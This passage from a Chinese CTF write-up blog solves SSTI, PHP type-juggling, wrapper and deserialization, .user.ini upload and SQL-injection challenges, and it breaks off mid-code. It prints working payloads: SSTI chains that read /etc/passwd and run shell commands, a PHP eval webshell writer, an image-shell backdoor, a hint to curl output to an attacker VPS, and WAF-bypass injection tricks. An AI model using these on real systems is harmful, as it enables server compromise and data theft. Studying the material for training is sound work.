<p>这段代码存在漏洞的原因是数据和代码的混淆。<strong>代码中的<code>code</code>是用户可控的，会和html拼接后直接带入渲染</strong>。</p>
<p>尝试构造code为一串js代码，会执行js，弹窗。</p>
<p>而以下代码：</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)
    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#x27;</span>,code=code)</code></pre>
<p>js代码被原样输出了。<strong>这是因为模板引擎一般都默认对渲染的变量值(猜测是`{{}}`)进行编码转义，这样就不会存在xss了**。在这段代码中用户**所控的是code变量，而不是模板内容**。**存在漏洞的代码中，模板内容直接受用户控制的**。

不仅可以xss，还可以进行其他攻击

###### SSTI文件读取/命令执行

<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)
    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)
    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre>

构造参数8，返回执行结果8，</strong>可以看到表达式被执行了。**</p>
<p>那么可以<strong>通过python的对象的继承、利用可用子类的方法来一步步实现文件读取和命令执行，具体看参考链接</strong></p>
<p>利用：【<span style="background:#FF9999;">因为位置可能不同，所以用if查找</span>】</p>
<ul>
<li>==读文件：==</li>
</ul>
<pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;   //py2
还有:
().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()

object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()

更保险：
 &#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if
 c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123;</span>
<span class="hljs-emphasis"> c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;在这里输入文件名&#x27;, &#x27;r&#x27;).read()</span>
<span class="hljs-emphasis"> &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 		//py3</span></code></pre>
<ul>
<li>==写文件==</li>
</ul>
<pre><code class="hljs markdown">//写文件
().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)
object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)</code></pre>
<ul>
<li>==命令执行==</li>
</ul>
<pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2].<span class="hljs-strong">__subclasses__</span>()[71].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].system(&#x27;ls&#x27;)
&#125;&#125;
还有：
().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals.values()[<span class="hljs-string">13</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&#x27;<span class="hljs-strong">__import__</span>(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if</span>
<span class="hljs-emphasis">c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123;
c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  	//py3</code></pre>
<p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye)</p>
<p><span style="background:#FF9999;">测试是否有注入点 2
之类的，成功执行则说明有模版注入</span></p>
<h6 id="下划线被过滤">下划线被过滤？</h6>
<p>可以用request.args获取get参数绕过</p>
<p>例如</p>
<pre><code class="hljs markdown">http://e0579dc296f4fa31220536d95e3b68b5.challenge.mini.lctf.online:1080/?class=<span class="hljs-strong">__class__</span>&amp;mro=<span class="hljs-strong">__mro__</span>&amp;subclasses=<span class="hljs-strong">__subclasses__</span>&amp;init=<span class="hljs-strong">__init__</span>&amp;globals=<span class="hljs-strong">__globals__</span>&amp;popen=popen&amp;cmd=cat /flag

&#123;&#123;()[<span class="hljs-string">request.args.class</span>][<span class="hljs-symbol">request.args.mro</span>][<span class="hljs-string">-1</span>][<span class="hljs-symbol">request.args.subclasses</span>]()[<span class="hljs-string">127</span>][<span class="hljs-symbol">request.args.init</span>][<span class="hljs-string">request.args.globals</span>][<span class="hljs-symbol">request.args.popen</span>](request.args.cmd).read() &#125;&#125;</code></pre>
<h4 id="解题">解题</h4>
<p>flag in /fllllllllllllag</p>
<p>md5(cookie_secret+md5(filename))</p>
<p>针对报错界面的/error?msg=Error尝试模板注入</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" srcset="/img/loading.gif" alt="image-20220227211937496"></p>
<p>输入/error?msg=2，返回2</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210519796.png" srcset="/img/loading.gif" alt="image-20220228210519796"></p>
<p>/error?msg=8，返回ORZ</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210447911.png" srcset="/img/loading.gif" alt="image-20220228210447911"></p>
<p><code>/error?msg=&#123;&#123;4/2&#125;&#125;</code>，除和减也是返回ORZ，<code>/error?msg=&#123;&#123;*&#125;&#125;</code>、<code>/error?msg=&#123;&#123;_&#125;&#125;</code>也是返回ORZ，应该是过滤了特殊字符</p>
<h6 id="怎么找cookie_secret呢">怎么找cookie_secret呢？</h6>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c4070d6f4249">具体分析，源码</a></p>
</blockquote>
<p>查看wp发现<strong>用的就是handler.settings对象</strong></p>
<ol type="1">
<li>什么是cookie_secret? <a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html">tornado文档</a>里的部分源码：</li>
</ol>
<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainHandler</span>(<span class="hljs-params">BaseHandler</span>):</span>
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>
        name = tornado.escape.xhtml_escape(self.current_user)
        self.write(<span class="hljs-string">&quot;Hello, &quot;</span> + name)

settings = &#123;
    <span class="hljs-string">&quot;cookie_secret&quot;</span>: <span class="hljs-string">&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;</span>,
    <span class="hljs-string">&quot;login_url&quot;</span>: <span class="hljs-string">&quot;/login&quot;</span>,
&#125;
application = tornado.web.Application([
    (<span class="hljs-string">r&quot;/&quot;</span>, MainHandler),
    (<span class="hljs-string">r&quot;/login&quot;</span>, LoginHandler),
], **settings)</code></pre>
<p>settings中的属性"cookie_secret"（应该是一个经过HMAC加密的够长且随机的字节序列）</p>
<p>settings又作为参数传入了Application类构造函数</p>
<p><strong>因此可以通过<code>self.application.settings</code>获取到cookie_secret</strong></p>
<ol start="2" type="1">
<li><p>RequestHandler类中的一个方法<strong>将RequestHandler类本身赋值给了handler</strong>，因此handler.settings实际上就是RequestHandler.settings（self.setting）【即<code>handler</code>就等于
<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.tornadoweb.org%2Fen%2Flatest%2Fweb.html%23tornado.web.RequestHandler"><code>RequestHandler</code></a>
】</p></li>
<li><p><code>RequestHandler.settings</code>别名
<code>self.application.settings</code></p></li>
<li><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler
指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以<code>handler.settings</code>就指向RequestHandler.application.settings了，这里面就是我们的一些<strong><em>环境变量</em></strong></p></li>
</ol>
<p>==简单而言通过<code>&#123;&#123;handler.application.settings&#125;&#125;</code>或者<code>&#123;&#123;handler.settings&#125;&#125;</code>就可获得<code>settings</code>中的<strong>cookie_secret</strong>。==</p>
<p><code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>得到cookie_secret:9d1f67f0-bb20-4878-a71e-16da5ce18c57</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211001182.png" srcset="/img/loading.gif" alt="image-20220228211001182"></p>
<p>❗注意，这个与抓包里的cookie无关</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211146954.png" srcset="/img/loading.gif" alt="image-20220228211146954"></p>
<p>计算filehash:md5(cookie_secret+md5(filename))</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$a=<span class="hljs-string">&#x27;9d1f67f0-bb20-4878-a71e-16da5ce18c57&#x27;</span>;
$b=<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span>;
<span class="hljs-comment">//echo $a.$b;</span>
<span class="hljs-keyword">echo</span> md5($a.md5($b));</code></pre>
<p>payload：</p>
<pre><code class="hljs sas">/<span class="hljs-meta">file</span>?<span class="hljs-meta">filename</span>=/fllllllllllllag<span class="hljs-variable">&amp;filehash</span>=f0c23d729e726f692178be3dda2f2b4b</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211604055.png" srcset="/img/loading.gif" alt="image-20220228211604055"></p>
<h2 id="极客大挑战-2019buyflag易">[极客大挑战 2019]BuyFlag（易）</h2>
<h4 id="考点弱类型比较绕过数据长度限制strcmp">考点：弱类型比较、绕过数据长度限制、strcmp</h4>
<p>点进菜单的payflag，提示:</p>
<pre><code class="hljs erlang-repl">If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!!</code></pre>
<p>在源码里发现提示</p>
<pre><code class="hljs php">	~~~post money <span class="hljs-keyword">and</span> password~~~
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;
	$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];
	<span class="hljs-keyword">if</span> (is_numeric($password)) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;
	&#125;<span class="hljs-keyword">elseif</span> ($password == <span class="hljs-number">404</span>) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;
	&#125;
&#125;</code></pre>
<p>关于You must be a student from
CUIT!!!，尝试修改referer不对，发现cookie：user=0，修改为CUIT也不对，修改为1，正确</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161122799.png" srcset="/img/loading.gif" alt="image-20220305161122799"></p>
<p>绕过password：</p>
<pre><code class="hljs erlang-repl">password=<span class="hljs-number">404</span>    ==》password can&#x27;t be number
password=<span class="hljs-string">&#x27;404&#x27;</span>  ==》Wrong Password!!   ==》给的是部分php源码
password=<span class="hljs-number">404</span>a   ==》Password Right!Pay for the flag!!!hacker!!!</code></pre>
<p>根据Flag need your 100000000 money，猜测还有个参数money</p>
<pre><code class="hljs lsl">password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100000000</span>  ==》Password Right!&lt;/br&gt;Nember lenth is too long&lt;/br&gt;
password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100</span>  ==&gt;&gt;Password Right!&lt;/br&gt;you have not enough <span class="hljs-section">money</span>,loser~&lt;/br&gt;	
用科学计数法,<span class="hljs-number">1e10</span>即<span class="hljs-number">1</span>*<span class="hljs-number">10</span>的<span class="hljs-number">10</span>次方，大于等于<span class="hljs-number">9</span>就能买了
password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">1e10</span>  ==&gt;&gt;Password Right!&lt;/br&gt;flag&#123;fb7ec519<span class="hljs-number">-90e9</span><span class="hljs-number">-47</span>d4<span class="hljs-number">-92</span>cf-ba9b204eeb54&#125;</code></pre>
<blockquote>
<p><strong>在</strong><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/科学计数法">科学计数法</a><strong>中，为了使公式简便，可以用带“E”的格式表示。当用该格式表示时，E前面的数字和“E+”后面要精确到十分位，（位数不够末尾补0）,例如7.8乘10的7次方，正常写法为：7.8x10^7,简写为“7.8E+07”的形式</strong></p>
</blockquote>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161955432.png" srcset="/img/loading.gif" alt="image-20220305161955432"></p>
<p>更多方法：</p>
<p>绕numeric的：</p>
<blockquote>
<p><strong><em>is_numberic():就是判断括号里面的变量是不是数值</em></strong>
漏洞绕过：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p>
</blockquote>
<pre><code class="hljs angelscript">在后面加上%<span class="hljs-number">20</span>跳过：<span class="hljs-number">404</span>%<span class="hljs-number">20</span></code></pre>
<p>绕money的：<strong>长度有问题，应该是strcmp函数检测的</strong></p>
<blockquote>
<p>strcmp函数漏洞：strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值NULL，<strong>NULL==0</strong>，正是利用这点进行绕过</p>
</blockquote>
<pre><code class="hljs cpp">money[]可以绕开<span class="hljs-built_in">strcmp</span>函数</code></pre>
<h2 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h2>
<h4 id="考点flle_get_contents-伪协议字符比较反序列化echo-tostring">考点：flle_get_contents()
、伪协议字符比较、反序列化echo tostring</h4>
<h4 id="php">php://</h4>
<ul>
<li><strong>条件</strong>：
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code>
:仅<code>php://input php://stdin php://memory php://temp</code>需要on</li>
</ul></li>
</ul>
<p>php://filter用于读取源码，php://input用于执行php代码。</p>
<table>
<colgroup>
<col style="width: 16%">
<col style="width: 83%">
</colgroup>
<thead>
<tr class="header">
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>php://input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，==在<code>enctype="multipart/form-data"</code>
的时候<code>php://input</code>是无效的。==</td>
</tr>
<tr class="even">
<td>php://filter</td>
<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，<strong>类似
<code>readfile()</code>、<code>file()</code> 和
<code>file_get_contents()</code></strong>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs php">示例：
http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>

写入一句话：
http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;1juhua.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre>
<h4 id="date">date://</h4>
<ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><p><code>allow_url_fopen</code>:on</p></li>
<li><p><code>allow_url_include</code> :on</p></li>
<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li>
<li><p>用法：</p></li>
</ul>
<pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,</span>
data:<span class="hljs-comment">//text/plain;base64,</span>
http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain,<span class="hljs-meta">&lt;?php</span>%20phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></li>
</ul>
<h4 id="flle_get_contents">flle_get_contents()</h4>
<p>flle_get_contents() 函数,而这个函数是可以绕过的 绕过方式有多种:
●使用php://input伪协议绕过 ①将要GET的参数?xxx=php://input
②用post方法传入想要file_get_contents() 函数返回的值 ●用data://伪协议绕过
将url改为: ?xxx=data://text/plain;base64,想要 file_get_contents()
函数返回的值的base64编码 或者将url改为:
?xxx=data:text/plain,(url编码的内容)</p>
<p>==php://input和data://常在CTF里用来绕过一些判断语句;、file_get_contents()==</p>
<p><strong>总结：</strong></p>
<p>data://　　　　写入数据</p>
<p>php://input　　执行php</p>
<p>　　//filter　　查看源码</p>
<p>解题：index.php源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  
$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];
$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];
$password = $_GET[<span class="hljs-string">&quot;password&quot;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;  <span class="hljs-comment">//伪协议绕过</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;
        <span class="hljs-keyword">exit</span>(); 
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">include</span>($file);  <span class="hljs-comment">//useless.php   通过伪协议filter读取文件源码</span>
        $password = unserialize($password);  <span class="hljs-comment">//反序列化触发wake_up，这里并不是这个考点</span>
        <span class="hljs-keyword">echo</span> $password;   <span class="hljs-comment">//echo对象会触发tostring</span>
    &#125;
&#125;
<span class="hljs-keyword">else</span>&#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>用data://绕过file_get_contents，php://filter绕过include读取文件base64源码</p>
<pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,welcome to the zjctf&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=useless.php&amp;password=<span class="hljs-number">2</span></code></pre>
<p>读到useless.php源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>
    <span class="hljs-keyword">public</span> $file;  
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//如果对象被当作字符串echo会触发这个方法</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  
            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); 
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);
        &#125;  
    &#125;  
&#125;  
<span class="hljs-meta">?&gt;</span></code></pre>
<p>password反序列化读flag.php，</p>
<p>payload:构造序列化脚本：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;
	<span class="hljs-keyword">public</span> $file=<span class="hljs-string">&#x27;flag.php&#x27;</span>;
&#125; 
$flag = <span class="hljs-keyword">new</span> Flag();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;</code></pre>
<p>查看源码得到flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307210749077.png" srcset="/img/loading.gif" alt="image-20220307210749077" style="zoom:80%;"></p>
<h2 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h2>
<h4 id="考点nginx的.user.ini图片头">考点：nginx的.user.ini、图片头</h4>
<p>关键点就是.user.ini与.htaccess的应用范围、.user.ini还需要同目录下存在一个可执行的php文件、上传图片马后url访问的不是图片地址，而是可执行php文件地址</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6091">参考WP</a></p>
</blockquote>
<p>文件上传</p>
<ol type="1">
<li><p>对后缀的过滤：php：不行，txt：可以，jpg：可以</p></li>
<li><p>上传图片马：发现过滤&lt;?，绕过:</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">php</span>&gt;</span>echo ‘123’;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li>
<li><p>上传.htaccess也不行，必须是图片：改Content-Type:
image/jpeg、后缀也不行（估计有图片头检验）</p></li>
</ol>
<p>​
然后加上图片头：<code>GIF89A</code>，发现没警告了，但是并不能解析成php</p>
<p><strong>原因在于本题服务器是nginx不是apache</strong>,（nginx要引用.htaccess也可以，但是还要进行某部分修改），这里显然不满足条件，所以没用。</p>
<h4 id="user.ini">.user.ini</h4>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20190824211552-4c92f9fe-c671-1.png" srcset="/img/loading.gif" alt="user.ini"></p>
<p>也就是说我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR 和
PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI
模式的服务器上都可以使用.user.ini</p>
<p><strong>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php）</strong>，类似于在index.php中插入一句：<code>require(./a.jpg)</code>;【<strong>类似.htaccess，只不过针对不同服务器</strong>】</p>
<ul>
<li><p>其中有两个配置，可以用来制造后门：
auto_append_file、auto_prepend_file
指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数.而auto_append_file类似，只是在文件后面包含</p></li>
<li><p>用法：</p>
<p>直接写在.user.ini中：</p>
<pre><code class="hljs awk">auto_prepend_file=test.jpg 或
auto_append_file=test.jpg（当文件调用的有<span class="hljs-keyword">exit</span>()时该设置无效）</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307214829826.png" srcset="/img/loading.gif" alt="image-20220307214829826"></p></li>
</ul>
<p>此时我们注意到上传目录下还有一个index.php，<strong>我们正好需要该目录下有一个可执行php文件</strong>，那这简直暴露了考点就是<code>.user.ini</code>，看来这个思路应该是可行的</p>
<p>上传<code>.user.ini</code>：</p>
<pre><code class="hljs routeros">GIF89a
<span class="hljs-attribute">auto_prepend_file</span>=shell.jpg</code></pre>
<p>上传图片马：shell.jpg</p>
<pre><code class="hljs xml">GIF89a
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="javascript">system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p>==最后，访问index.php，注意是可执行的php而不是访问上传的图片马！==</p>
<pre><code class="hljs awk"><span class="hljs-regexp">/uploads/</span>cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre>
<h4 id="user.ini实战利用的可能性">.user.ini实战利用的可能性</h4>
<p>综上所述<code>.user.ini</code>的利用条件如下：</p>
<ol type="1">
<li>服务器脚本语言为PHP</li>
<li>服务器使用CGI／FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ol>
<p><strong><em>从这来看<code>.user.ini</code>要比<code>.htaccess</code>的应用范围要广一些，毕竟<code>.htaccess</code>只能用于Apache</em></strong></p>
<p>但仔细推敲我们就会感到<strong>“上传目录下要有可执行的php文件”</strong>这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p>
<p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测<code>../</code>，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用<code>.user.ini</code></p>
<p>除此之外，把<code>.user.ini</code>利用在隐藏后门上应该是个很好的利用方法，我们在存在php文件的目录下留下<code>.user.ini</code>和我们的图片马，这样就达到了隐藏后门的目的。</p>
<h2 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h2>
<h4 id="考点报错注入空格被过滤截取部分字符串函数">考点：报错注入、空格=被过滤、截取部分字符串函数</h4>
<p>关键点就是针对各种过滤，先利用burp爆破sql注入关键词字典，看哪些没有被过滤的，发现updatexml没有==&gt;报错注入，然后针对被过滤的关键词找替代绕过，=》like，空格》()，and》^，然后针对updatexml、extractvalue的缺陷：只能返回32位数据，利用字符串截取函数截取剩下部分flag</p>
<blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264593.html"><strong>MySQL注入绕过WAF的基础方式</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-30"><strong>对MYSQL注入相关内容及部分Trick、绕过的归类小结</strong></a></p>
</blockquote>
<p>用sql关键词字典爆破，线程数调低点，发现过滤了=、union、by、！、&amp;、|、*、空格【()、%0a绕过】、and、、</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220308210613847.png" srcset="/img/loading.gif" alt="image-20220308210613847" style="zoom:67%;"></p>
<p><strong>但是！</strong>没有过滤<code>updatexml</code>、extractvalue==》尝试报错注入</p>
<pre><code class="hljs excel"><span class="hljs-built_in">and</span>、<span class="hljs-built_in">or</span>、&amp;&amp;、||被过滤——可用运算符! ^ ~以及<span class="hljs-built_in">not</span> <span class="hljs-built_in">xor</span>来代替
空格被过滤——%<span class="hljs-number">09</span>, %<span class="hljs-number">0</span>a, %<span class="hljs-number">0</span>b, %<span class="hljs-number">0</span>c, %<span class="hljs-number">0</span>d, %<span class="hljs-symbol">a0</span>（等部分不可见字符可也代替空格）、<span class="hljs-built_in">and</span>/<span class="hljs-built_in">or</span>后面可以跟上偶数个!、~可以替代空格、改用+号、使用注释代替、多层括号嵌套
= -&gt; like -&gt; regexp -&gt; &lt;&gt; -&gt; in</code></pre>
<h4 id="报错注入">报错注入：</h4>
<p>函数：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">exp</span>(~(select * from(select user())a))
<span class="hljs-attribute">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)   //三个参数  <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e:~
